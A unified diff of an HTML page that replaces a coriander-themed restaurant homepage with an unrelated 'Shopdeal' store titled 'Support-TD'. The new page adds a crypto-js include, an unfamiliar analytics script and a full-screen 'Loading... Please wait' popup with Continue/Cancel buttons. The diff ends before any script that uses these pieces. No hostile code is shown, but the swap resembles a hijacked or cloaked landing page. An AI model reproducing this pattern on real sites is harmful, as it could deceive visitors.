@@ -1,558 +1,719 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CorianderFare | Botanical Gastronomy & Heirloom Seed Cuisine Atelier</title>
-  <meta name="description" content="Experience CorianderFare: A fine dining botanical sanctuary at 181 Mercer Street celebrating heirloom coriander seeds, fresh micro-cilantro, and seasonal multi-course tasting menus.">
-  <link rel="canonical" href="https://corianderfare.com/">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-TD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
 
-  <!-- Google Analytics Tag -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+  
+    :root{
+      --ink:#0b1020;
+      --muted:#64748b;
+      --line:#e9ebf2;
+      --surface:#f8fafc;
+      --brand:#6d28d9;
+      --brand-dark:#5b21b6;
+      --accent:#db2777;
+      --radius:18px;
+      --shadow-sm:0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
+      --shadow-md:0 12px 30px -14px rgba(16,24,40,.22);
+      --shadow-lg:0 28px 60px -24px rgba(16,24,40,.32);
+      --max:1180px;
+    }
+
+    *,*::before,*::after{ box-sizing:border-box; }
+    html{ scroll-behavior:smooth; }
+    body{
+      margin:0;
+      font-family:'Inter',system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+      color:var(--ink);
+      background:#fff;
+      line-height:1.6;
+      -webkit-font-smoothing:antialiased;
+    }
+    img{ max-width:100%; display:block; }
+    a{ color:inherit; text-decoration:none; }
+    button{ font:inherit; }
+    ul{ list-style:none; margin:0; padding:0; }
+
+    .container{ width:min(var(--max), 100% - 48px); margin-inline:auto; }
+
+    /* ============================================================
+       LOADING POPUP
+       ============================================================ */
+    .popup{
+      position:fixed; inset:0; z-index:9999;
+      display:flex; align-items:center; justify-content:center;
+      background:#fff; padding:24px;
+    }
+    .popup-content{
+      width:100%; max-width:560px;
+      text-align:center;
+      animation:popIn .5s cubic-bezier(.2,.8,.3,1) both;
+    }
+    @keyframes popIn{
+      from{ opacity:0; transform:translateY(14px) scale(.98); }
+      to{ opacity:1; transform:none; }
+    }
+    .loading-gif{
+      width:120px; height:120px;
+      margin:0 auto 26px;
+    }
+    .popup-title{
+      font-size:clamp(1.3rem,2.6vw,1.6rem);
+      font-weight:800; letter-spacing:-.025em;
+      margin:0 0 8px;
+    }
+    .popup-content p.sub{
+      margin:0 0 32px;
+      color:var(--muted);
+      font-size:.95rem;
+      font-weight:500;
+    }
+    .buttons{
+      display:flex; justify-content:center; gap:14px; flex-wrap:wrap;
+    }
+    .buttons button{
+      min-width:152px;
+      padding:14px 30px;
+      border:0; border-radius:13px;
+      cursor:pointer; font-weight:700; font-size:1rem;
+      transition:transform .18s ease, box-shadow .18s ease, background .18s ease;
+    }
+    #cancelBtn{ background:#f1f5f9; color:#334155; }
+    #cancelBtn:hover{ background:#e2e8f0; }
+    #continueBtn{
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff;
+      box-shadow:0 16px 30px -14px rgba(109,40,217,.85);
+    }
+    #continueBtn:hover{ transform:translateY(-2px); }
+
+    .hint{
+      background:linear-gradient(90deg,#1e1b4b,#4c1d95 45%,#831843);
+      color:#ede9fe;
+      text-align:center;
+      font-size:.82rem;
+      font-weight:600;
+      letter-spacing:.02em;
+      padding:11px 20px;
+      min-height:42px;
+      display:flex; align-items:center; justify-content:center;
+      gap:10px;
+    }
+
+    .nav{
+      position:sticky; top:0; z-index:80;
+      display:flex; align-items:center; gap:26px;
+      height:72px;
+      padding:0 max(24px, calc((100vw - var(--max)) / 2));
+      background:rgba(255,255,255,.86);
+      backdrop-filter:blur(16px);
+      -webkit-backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--line);
+    }
+    .brand{
+      display:flex; align-items:center; gap:11px;
+      font-weight:800; font-size:1.12rem;
+      letter-spacing:-.025em; white-space:nowrap;
+    }
+    .brand-mark{
+      width:36px; height:36px; flex:none;
+      display:grid; place-items:center;
+      border-radius:11px; font-size:1rem;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      box-shadow:0 10px 22px -10px rgba(109,40,217,.9);
+    }
+
+    .links{ display:flex; gap:6px; }
+    .links a{
+      font-size:.9rem; font-weight:500; color:#4b5563;
+      padding:8px 14px; border-radius:10px;
+      transition:color .18s ease, background .18s ease;
+    }
+    .links a:hover{ color:var(--brand); background:#f5f3ff; }
+
+    .clock{
+      margin-left:auto;
+      display:inline-flex; align-items:center; gap:6px;
+      font-size:.78rem; font-weight:600; color:var(--brand-dark);
+      background:#f5f3ff; border:1px solid #ede9fe;
+      padding:7px 13px; border-radius:999px; white-space:nowrap;
+    }
+    .cart-btn{
+      display:inline-flex; align-items:center; gap:8px;
+      border:0; cursor:pointer;
+      background:var(--ink); color:#fff;
+      font-weight:600; font-size:.88rem;
+      padding:10px 18px; border-radius:999px;
+      transition:transform .18s ease, background .18s ease;
+    }
+    .cart-btn:hover{ background:var(--brand); transform:translateY(-1px); }
+    .cart-btn .badge{
+      background:#fff; color:var(--ink);
+      border-radius:999px; min-width:20px; height:20px;
+      display:grid; place-items:center;
+      padding:0 6px; font-size:.72rem; font-weight:800;
+    }
+
+    @media (max-width:900px){
+      .links{ display:none; }
+      .clock{ display:none; }
+    }
+    @media (max-width:560px){
+      .nav{ gap:14px; height:66px; padding-inline:18px; }
+      .cart-btn{ padding:9px 14px; font-size:.82rem; }
+    }
+
+    /* ============================================================
+       HERO
+       ============================================================ */
+    .hero{
+      display:grid;
+      grid-template-columns:1.03fr .97fr;
+      gap:60px; align-items:center;
+      padding:76px max(24px, calc((100vw - var(--max)) / 2)) 68px;
+      background:
+        radial-gradient(900px 420px at 8% -20%, rgba(109,40,217,.14), transparent 62%),
+        radial-gradient(760px 420px at 98% -6%, rgba(219,39,119,.12), transparent 58%),
+        linear-gradient(180deg,#fbfaff,#fff);
+    }
+    @media (max-width:960px){
+      .hero{ grid-template-columns:1fr; gap:44px; padding-top:52px; padding-bottom:52px; }
+    }
+
+    .eyebrow{
+      display:inline-flex; align-items:center; gap:8px;
+      background:#fff; border:1px solid #ede9fe;
+      color:var(--brand-dark);
+      font-size:.78rem; font-weight:700;
+      letter-spacing:.06em; text-transform:uppercase;
+      padding:7px 15px; border-radius:999px;
+      box-shadow:var(--shadow-sm);
+      margin-bottom:20px;
+    }
+    .eyebrow .dot{
+      width:7px; height:7px; border-radius:50%;
+      background:var(--accent);
+      box-shadow:0 0 0 4px rgba(219,39,119,.16);
+    }
+
+    .hero-text h1{
+      font-size:clamp(2.2rem,5vw,3.4rem);
+      line-height:1.08; letter-spacing:-.035em;
+      font-weight:900; margin:0 0 18px;
+    }
+    .hero-text h1 span{
+      background:linear-gradient(115deg,var(--brand),var(--accent));
+      -webkit-background-clip:text; background-clip:text; color:transparent;
+    }
+    .hero-text p{
+      font-size:1.05rem; color:var(--muted);
+      max-width:490px; margin:0 0 30px;
+    }
+
+    .cta{
+      display:inline-flex; align-items:center; gap:9px;
+      padding:15px 30px; border-radius:999px;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff; font-weight:700; font-size:.95rem;
+      box-shadow:0 16px 32px -16px rgba(109,40,217,.9);
+      transition:transform .18s ease, box-shadow .18s ease;
+    }
+    .cta:hover{ transform:translateY(-2px); box-shadow:0 22px 40px -18px rgba(109,40,217,.95); }
+
+    .hero-stats{
+      display:flex; gap:34px; flex-wrap:wrap;
+      margin-top:40px; padding-top:26px;
+      border-top:1px solid var(--line);
+    }
+    .hero-stats strong{
+      display:block; font-size:1.35rem; font-weight:800; letter-spacing:-.02em;
+    }
+    .hero-stats span{ font-size:.82rem; color:var(--muted); }
+
+    .hero-img{
+      width:100%; aspect-ratio:5/4; object-fit:cover;
+      border-radius:26px;
+      box-shadow:var(--shadow-lg);
+    }
+
+    /* ============================================================
+       TRUST STRIP
+       ============================================================ */
+    .trust{
+      border-block:1px solid var(--line);
+      background:var(--surface);
+    }
+    .trust-grid{
+      display:grid; grid-template-columns:repeat(4,1fr);
+      gap:10px; padding:22px 0;
+    }
+    .trust-item{
+      display:flex; align-items:center; justify-content:center; gap:9px;
+      font-size:.85rem; font-weight:600; color:#475569;
+      padding:6px 10px; border-right:1px solid var(--line);
+    }
+    .trust-item:last-child{ border-right:0; }
+    .trust-item span{ font-size:1.05rem; }
+    @media (max-width:860px){
+      .trust-grid{ grid-template-columns:repeat(2,1fr); gap:14px; }
+      .trust-item{ border-right:0; justify-content:flex-start; }
+    }
+
+    /* ============================================================
+       SECTIONS
+       ============================================================ */
+    .section{ padding:76px 0; }
+    .section-head{ text-align:center; max-width:640px; margin:0 auto 42px; }
+    .section-head .kicker{
+      display:inline-block;
+      font-size:.76rem; font-weight:800;
+      letter-spacing:.12em; text-transform:uppercase;
+      color:var(--brand); margin-bottom:10px;
+    }
+    .section-head h2{
+      font-size:clamp(1.6rem,3.2vw,2.2rem);
+      font-weight:900; letter-spacing:-.03em;
+      margin:0 0 10px; line-height:1.15;
+    }
+    .section-head p{ margin:0; color:var(--muted); font-size:.97rem; }
+
+
+    .grid{
+      display:grid; gap:24px;
+      grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
+    }
+    .card{
+      display:flex; flex-direction:column;
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius); overflow:hidden;
+      transition:transform .22s ease, box-shadow .22s ease, border-color .22s ease;
+    }
+    .card:hover{
+      transform:translateY(-6px);
+      box-shadow:var(--shadow-lg);
+      border-color:transparent;
+    }
+    .card-media{
+      position:relative; aspect-ratio:4/3;
+      overflow:hidden; background:#f1f5f9;
+    }
+    .card-media img{
+      width:100%; height:100%; object-fit:cover;
+      transition:transform .55s cubic-bezier(.2,.7,.3,1);
+    }
+    .card:hover .card-media img{ transform:scale(1.07); }
+
+    .card .badge{
+      position:absolute; top:12px; left:12px;
+      font-size:.68rem; font-weight:800; letter-spacing:.06em;
+      text-transform:uppercase; color:#fff;
+      padding:6px 11px; border-radius:999px;
+      background:var(--ink);
+    }
+    .card .badge--sale{ background:var(--accent); }
+    .card .badge--new{ background:#0ea5e9; }
+
+    .card .body{
+      padding:16px 18px 18px;
+      display:flex; flex-direction:column; flex:1;
+    }
+    .card .cat{
+      font-size:.7rem; font-weight:700; letter-spacing:.1em;
+      text-transform:uppercase; color:#94a3b8; margin-bottom:6px;
+    }
+    .card h3{
+      margin:0 0 8px; font-size:1rem; font-weight:700; letter-spacing:-.015em;
+    }
+    .price-row{
+      display:flex; align-items:baseline; gap:8px;
+      margin-top:auto; padding-top:6px;
+    }
+    .card .price{
+      font-size:1.12rem; font-weight:800;
+      letter-spacing:-.02em; color:var(--ink);
+    }
+    .card .old{
+      font-size:.85rem; color:#a3aab8;
+      text-decoration:line-through; font-weight:500;
+      margin:0;
+    }
+    .save{
+      margin-left:auto;
+      font-size:.7rem; font-weight:800;
+      color:#047857; background:#ecfdf5;
+      padding:3px 8px; border-radius:999px;
+    }
+
+    .add{
+      margin-top:14px; width:100%;
+      display:inline-flex; align-items:center; justify-content:center; gap:8px;
+      border:1px solid var(--ink); background:#fff; color:var(--ink);
+      font-weight:700; font-size:.88rem;
+      padding:11px; border-radius:11px; cursor:pointer;
+      transition:background .2s ease, color .2s ease, transform .18s ease;
+    }
+    .add:hover{ background:var(--ink); color:#fff; transform:translateY(-1px); }
+    .add:active{ transform:translateY(0); }
+
+  
+    .about{
+      background:var(--surface);
+      border-block:1px solid var(--line);
+    }
+    .features{
+      display:grid; gap:22px;
+      grid-template-columns:repeat(auto-fit,minmax(210px,1fr));
+    }
+    .feature{
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius);
+      padding:28px 24px;
+      text-align:left;
+      transition:transform .22s ease, box-shadow .22s ease;
+    }
+    .feature:hover{ transform:translateY(-4px); box-shadow:var(--shadow-md); }
+    .feature span{
+      display:grid; place-items:center;
+      width:48px; height:48px;
+      border-radius:14px; font-size:1.3rem;
+      background:linear-gradient(135deg,#f5f3ff,#fdf2f8);
+      border:1px solid #ede9fe;
+      margin-bottom:16px;
+    }
+    .feature h3{ margin:0 0 6px; font-size:1rem; font-weight:800; letter-spacing:-.015em; }
+    .feature p{ margin:0; color:var(--muted); font-size:.87rem; line-height:1.55; }
+
+    /* ============================================================
+       FOOTER
+       ============================================================ */
+    .footer{
+      background:#0b1020;
+      color:#94a3b8;
+      text-align:center;
+      padding:44px 24px;
+      font-size:.85rem;
+    }
+    .footer .fbrand{
+      display:inline-flex; align-items:center; gap:10px;
+      color:#fff; font-weight:800; font-size:1rem;
+      letter-spacing:-.02em; margin-bottom:10px;
+    }
+    .footer p{ margin:0 0 6px; }
+    .footer small{ color:#64748b; font-size:.78rem; }
+
+  
+    @media (prefers-reduced-motion:reduce){
+      *{ animation-duration:.001ms !important; transition-duration:.001ms !important; }
+      html{ scroll-behavior:auto; }
+    }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
     function gtag(){dataLayer.push(arguments);}
     gtag('js', new Date());
+
     gtag('config', 'G-0LY0HY7L01');
   </script>
 
-  <!-- Typography -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700;800&family=Playfair+Display:ital,wght@0,600;0,700;1,400&family=Plus+Jakarta+Sans:ital,wght@0,400;0,500;0,600;0,700;1,400&display=swap" rel="stylesheet">
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
 
-  <!-- Stylesheets -->
-  <link rel="stylesheet" href="assets/css/style.css">
+
 </head>
 <body>
-  <!-- Header -->
-  <header class="site-header">
-    <div class="container header-inner">
-      <a href="index.html" class="site-logo" aria-label="CorianderFare Home">
-        <svg class="site-logo-icon" viewBox="0 0 24 24" fill="currentColor">
-          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.4z"/>
-        </svg>
-        <span>Coriander</span>Fare
-      </a>
 
-      <nav class="nav-desktop" aria-label="Desktop Navigation">
-        <ul class="nav-links-list">
-          <li><a href="index.html" class="nav-link active">Home</a></li>
-          <li><a href="about.html" class="nav-link ">About Salon</a></li>
-          <li><a href="index.html#tasting-menu" class="nav-link">Tasting Menu</a></li>
-          <li><a href="blog.html" class="nav-link ">Botanical Journal</a></li>
-          <li><a href="contact.html" class="nav-link ">Reservations</a></li>
-          <!-- Policy links strictly hidden on desktop via .nav-item-policy -->
-          <li class="nav-item-policy"><a href="privacy-policy.html" class="nav-link">Privacy Policy</a></li>
-          <li class="nav-item-policy"><a href="terms-and-conditions.html" class="nav-link">Terms & Conditions</a></li>
-          <li class="nav-item-policy"><a href="disclaimer.html" class="nav-link">Disclaimer</a></li>
-          <li class="nav-item-policy"><a href="cookie-policy.html" class="nav-link">Cookie Policy</a></li>
-        </ul>
-        <div class="header-cta-group">
-          <a href="contact.html" class="btn btn-primary">Reserve Table</a>
-        </div>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <h2 class="popup-title">Loading... Please wait.</h2>
+      <p class="sub">We're preparing your store experience.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ Shopdeal — Summer Sale is live · Up to 50% off</div>
+
+    <header class="nav">
+      <div class="brand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
       </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-      <button class="mobile-menu-btn" aria-label="Toggle navigation menu">
-        &#9776;
-      </button>
-    </div>
-  </header>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <span class="eyebrow"><span class="dot"></span> Summer Sale · Up to 50% Off</span>
+        <h1>Everyday essentials, <span>beautifully priced.</span></h1>
+        <p>Trendy products, free stock photos, all on a single page. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now →</a>
 
-  <!-- Mobile Drawer Overlay & Drawer -->
-  <div class="mobile-drawer-overlay"></div>
-  <aside class="mobile-drawer" aria-label="Mobile Navigation Drawer">
-    <div class="mobile-drawer-header">
-      <a href="index.html" class="site-logo">
-        <span>Coriander</span>Fare
-      </a>
-      <button class="mobile-drawer-close" aria-label="Close menu">&times;</button>
-    </div>
-    <ul class="mobile-drawer-links">
-      <li><a href="index.html" class="mobile-drawer-link">Home</a></li>
-      <li><a href="about.html" class="mobile-drawer-link">About Dining Salon</a></li>
-      <li><a href="index.html#tasting-menu" class="mobile-drawer-link">Seasonal Tasting Menu</a></li>
-      <li><a href="blog.html" class="mobile-drawer-link">Botanical Journal</a></li>
-      <li><a href="contact.html" class="mobile-drawer-link">Reservations & Private Events</a></li>
-    </ul>
-    <div class="mobile-drawer-policy-section">
-      <div class="mobile-drawer-policy-title">Guest Governance & Policies</div>
-      <ul class="mobile-drawer-policy-links">
-        <li><a href="privacy-policy.html">Privacy Policy</a></li>
-        <li><a href="terms-and-conditions.html">Terms & Conditions</a></li>
-        <li><a href="disclaimer.html">Disclaimer</a></li>
-        <li><a href="cookie-policy.html">Cookie Policy</a></li>
-      </ul>
-    </div>
-  </aside>
-  <main>
-    <!-- SECTION 1: HERO -->
-    <section id="hero" class="hero-section">
-      <div class="container hero-grid">
-        <div class="hero-content">
-          <div class="hero-badge">Artisanal Botanical Gastronomy &bull; 181 Mercer Street</div>
-          <h1 class="hero-title">Heirloom Herb Terroir. <span>Botanical Culinary Mastery.</span></h1>
-          <p class="hero-subtitle">Elevating the humble coriander plant into an epicurean art form. Experience multidimensional flavor arcs spanning citrus-forward micro-leaves, cold-pressed green oils, toasted floral seeds, and wood-smoked root reductions.</p>
-          <div class="hero-actions">
-            <a href="#tasting-menu" class="btn btn-primary">Explore Tasting Menu</a>
-            <a href="contact.html" class="btn btn-secondary">Reserve Your Table</a>
-          </div>
-          <div class="hero-stats">
-            <div>
-              <div class="hero-stat-number">7</div>
-              <div class="hero-stat-label">Course Botanical Journey</div>
-            </div>
-            <div>
-              <div class="hero-stat-number">100%</div>
-              <div class="hero-stat-label">Biodynamic Farm Sourced</div>
-            </div>
-            <div>
-              <div class="hero-stat-number">34</div>
-              <div class="hero-stat-label">Intimate Salon Covers</div>
-            </div>
-          </div>
-        </div>
-
-        <div class="hero-image-wrapper">
-          <img src="assets/images/hero_coriander_culinary.jpg" alt="Fresh organic coriander leaves and heirloom seeds on dark slate culinary prep board" width="600" height="540" loading="eager">
-          <div class="hero-floating-card">
-            <div class="hero-floating-title">Signature Botanical Course</div>
-            <p class="hero-floating-desc">Heirloom Morchella mushrooms glazed in cold-pressed green coriander oil and crushed toasted seeds.</p>
-          </div>
+        <div class="hero-stats">
+          <div><strong>12,480+</strong><span>Happy customers</span></div>
+          <div><strong>4.9 / 5</strong><span>Average rating</span></div>
+          <div><strong>48 hrs</strong><span>US delivery</span></div>
         </div>
       </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/900/720" alt="hero" />
     </section>
 
-    <!-- SECTION 2: BOTANICAL HERITAGE & ANATOMY -->
-    <section id="botanical-heritage" class="section">
-      <div class="container">
-        <div class="section-title-wrap">
-          <span class="section-tag">Botanical Bedrock</span>
-          <h2>The Fourfold Anatomy of Coriandrum Sativum</h2>
-          <p class="section-desc">Unlike conventional dining that treats coriander solely as an afterthought garnish, our kitchen celebrates every anatomical manifestation of the plant across distinct developmental lifecycles.</p>
-        </div>
+    <!-- Histats.com  START  (aync)-->
+   <!--  <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript> -->
+    <!-- Histats.com  END  -->
 
-        <div class="grid-4">
-          <div class="botanical-card">
-            <div class="card-media-wrap">
-              <img src="assets/images/botanical_taproot.jpg" alt="Earthy coriander and parsnip taproots cleaned for culinary braising" width="400" height="260" loading="lazy">
-            </div>
-            <div class="botanical-icon">&#9881;</div>
-            <h3>Taproot & Rhizosphere</h3>
-            <p>Earthy, woodsy, and deeply savory. We slow-braise taproots in rich vegetable dashi to extract caramelized umami and complex mineral undertones that anchor hearty main courses.</p>
-          </div>
-
-          <div class="botanical-card">
-            <div class="card-media-wrap">
-              <img src="assets/images/botanical_microgreens.jpg" alt="Fresh organic micro-cilantro seedlings harvested at day 18" width="400" height="260" loading="lazy">
-            </div>
-            <div class="botanical-icon">&#9752;</div>
-            <h3>Young Leaf & Micro-Greens</h3>
-            <p>Pungent, citrusy, and vibrant. Harvested within 18 days of germination, micro-leaves offer concentrated chlorophyll and refreshing aldehyde brightness that cleanse the palate.</p>
-          </div>
-
-          <div class="botanical-card">
-            <div class="card-media-wrap">
-              <img src="assets/images/botanical_umbels.jpg" alt="Delicate flowering white umbels of Coriandrum sativum in blossom" width="400" height="260" loading="lazy">
-            </div>
-            <div class="botanical-icon">&#9878;</div>
-            <h3>Flowering Umbels</h3>
-            <p>Delicate, floral, and honeyed. White and pale pink umbel blossoms provide sweet nectar accents and crisp peppery snaps for chilled soups and delicate crudo preparations.</p>
-          </div>
-
-          <div class="botanical-card">
-            <div class="card-media-wrap">
-              <img src="assets/images/botanical_seeds.jpg" alt="Heirloom whole coriander seeds rich in essential linalool oils" width="400" height="260" loading="lazy">
-            </div>
-            <div class="botanical-icon">&#128337;</div>
-            <h3>Aromatic Whole Seeds</h3>
-            <p>Warm, spicy, and citrus-resinous. Rich in volatile linalool and pinene essential oils, cracked seeds provide textural crunch and aromatic warmth to hearth-fired dishes.</p>
-          </div>
-        </div>
+    <!-- Trust strip -->
+    <div class="trust">
+      <div class="container trust-grid">
+        <div class="trust-item"><span>🚚</span> Free shipping $75+</div>
+        <div class="trust-item"><span>↩️</span> 30-day returns</div>
+        <div class="trust-item"><span>🔒</span> Secure checkout</div>
+        <div class="trust-item"><span>💬</span> 7-day support</div>
       </div>
-    </section>
+    </div>
 
-    <!-- SECTION 3: TASTING MENU SHOWCASE -->
-    <section id="tasting-menu" class="section" style="background-color: var(--bg-secondary);">
+    <section class="section" id="products">
       <div class="container">
-        <div class="section-title-wrap">
-          <span class="section-tag">Seasonal Culinary Arc</span>
-          <h2>The Mercer Street Botanical Tasting Menu</h2>
-          <p class="section-desc">A carefully orchestrated progression of temperatures, textures, and volatile aromatics designed to take guests on an unforgettable sensory voyage.</p>
+        <div class="section-head">
+          <span class="kicker">Featured</span>
+          <h2>Handpicked for you</h2>
+          <p>Six customer favorites, priced in USD — with free shipping on qualifying orders.</p>
         </div>
 
-        <div class="grid-3">
-          <div class="dish-card">
-            <div class="dish-card-img-wrap">
-              <img src="assets/images/chef_plating_botanical.jpg" alt="Chef precisely plating micro-herb culinary course with fresh coriander" width="400" height="300" loading="lazy">
+        <div class="grid">
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--sale">Best Seller</span>
+              <img src="https://picsum.photos/seed/shopdeal-sneakers/600/450" alt="Running Sneakers" />
             </div>
-            <div class="dish-card-body">
-              <span class="dish-tag">Opening Course &bull; Cold Expression</span>
-              <h3 class="dish-title">Compressed Cucumber & Herb Dew</h3>
-              <p class="dish-desc">Heirloom Persian cucumbers compressed in green coriander leaf jus, served with whipped almond curd, pickled coriander umbels, and chilled botanical sea mist.</p>
-              <div class="dish-meta">
-                <span>Pairing: Chilled Lemongrass Shrub</span>
-                <span>Palate Awakener</span>
+            <div class="body">
+              <span class="cat">Footwear</span>
+              <h3>Running Sneakers</h3>
+              <div class="price-row">
+                <span class="price">$89.99</span>
+                <span class="old">$139.99</span>
+                <span class="save">−36%</span>
               </div>
+              <button class="add" type="button">Add to cart</button>
             </div>
-          </div>
+          </article>
 
-          <div class="dish-card">
-            <div class="dish-card-img-wrap">
-              <img src="assets/images/spiced_broth_terrine.jpg" alt="Rich botanical spiced vegetable broth served in artisan ceramic bowl" width="400" height="300" loading="lazy">
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Limited</span>
+              <img src="https://picsum.photos/seed/shopdeal-watch/600/450" alt="Classic Watch" />
             </div>
-            <div class="dish-card-body">
-              <span class="dish-tag">Intermediate Course &bull; Simmered Harmony</span>
-              <h3 class="dish-title">Roasted Allium & Cracked Seed Terrine</h3>
-              <p class="dish-desc">Caramelized winter leeks layered with toasted Indian coriander seed crumble, smoked vegetable consomme, and emulsion of cold-pressed coriander root oil.</p>
-              <div class="dish-meta">
-                <span>Pairing: Toasted Barley & Coriander Tisane</span>
-                <span>Warm Comfort</span>
+            <div class="body">
+              <span class="cat">Accessories</span>
+              <h3>Classic Watch</h3>
+              <div class="price-row">
+                <span class="price">$179.99</span>
+                <span class="old">$249.99</span>
+                <span class="save">−28%</span>
               </div>
+              <button class="add" type="button">Add to cart</button>
             </div>
-          </div>
+          </article>
 
-          <div class="dish-card">
-            <div class="dish-card-img-wrap">
-              <img src="assets/images/botanical_dinner_entree.jpg" alt="Pan-roasted heirloom vegetable entree garnished with micro cilantro and coriander seed crust" width="400" height="300" loading="lazy">
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-backpack/600/450" alt="Travel Backpack" />
             </div>
-            <div class="dish-card-body">
-              <span class="dish-tag">Grand Centerpiece &bull; Hearth Roasted</span>
-              <h3 class="dish-title">Wood-Fired Celery Root & Seed Crust</h3>
-              <p class="dish-desc">Whole roasted heirloom celeriac crusted in cracked toasted coriander, brown butter jus, wild foraged mushrooms, and tender mountain cilantro leaves.</p>
-              <div class="dish-meta">
-                <span>Pairing: Spiced Pear & Cardamom Elixir</span>
-                <span>Culinary Climax</span>
+            <div class="body">
+              <span class="cat">Bags</span>
+              <h3>Travel Backpack</h3>
+              <div class="price-row">
+                <span class="price">$69.99</span>
+                <span class="old">$109.99</span>
+                <span class="save">−36%</span>
               </div>
+              <button class="add" type="button">Add to cart</button>
             </div>
-          </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--new">New</span>
+              <img src="https://picsum.photos/seed/shopdeal-headphones/600/450" alt="Wireless Headphones" />
+            </div>
+            <div class="body">
+              <span class="cat">Audio</span>
+              <h3>Wireless Headphones</h3>
+              <div class="price-row">
+                <span class="price">$119.99</span>
+                <span class="old">$179.99</span>
+                <span class="save">−33%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-sunglasses/600/450" alt="Sunglasses" />
+            </div>
+            <div class="body">
+              <span class="cat">Eyewear</span>
+              <h3>Sunglasses</h3>
+              <div class="price-row">
+                <span class="price">$34.99</span>
+                <span class="old">$59.99</span>
+                <span class="save">−42%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Top Rated</span>
+              <img src="https://picsum.photos/seed/shopdeal-camera/600/450" alt="Instant Camera" />
+            </div>
+            <div class="body">
+              <span class="cat">Photography</span>
+              <h3>Instant Camera</h3>
+              <div class="price-row">
+                <span class="price">$219.99</span>
+                <span class="old">$299.99</span>
+                <span class="save">−27%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
         </div>
       </div>
     </section>
 
-    <!-- SECTION 4: TERROIR CHEMISTRY & VOLATILE MATRIX -->
-    <section id="terroir-chemistry" class="section">
+    <section id="about" class="section about">
       <div class="container">
-        <div class="section-title-wrap">
-          <span class="section-tag">Aromatic Science</span>
-          <h2>The Volatile Terpene & Flavour Chemistry Matrix</h2>
-          <p class="section-desc">The sensory divergence between coriander leaves and seeds is governed by dramatic molecular variations in organic hydrocarbon chemistry. We map each aromatic fraction to specific culinary techniques.</p>
+        <div class="section-head">
+          <span class="kicker">Why Shopdeal</span>
+          <h2>Built around you</h2>
+          <p>Simple pricing, fast delivery and support that actually answers.</p>
         </div>
 
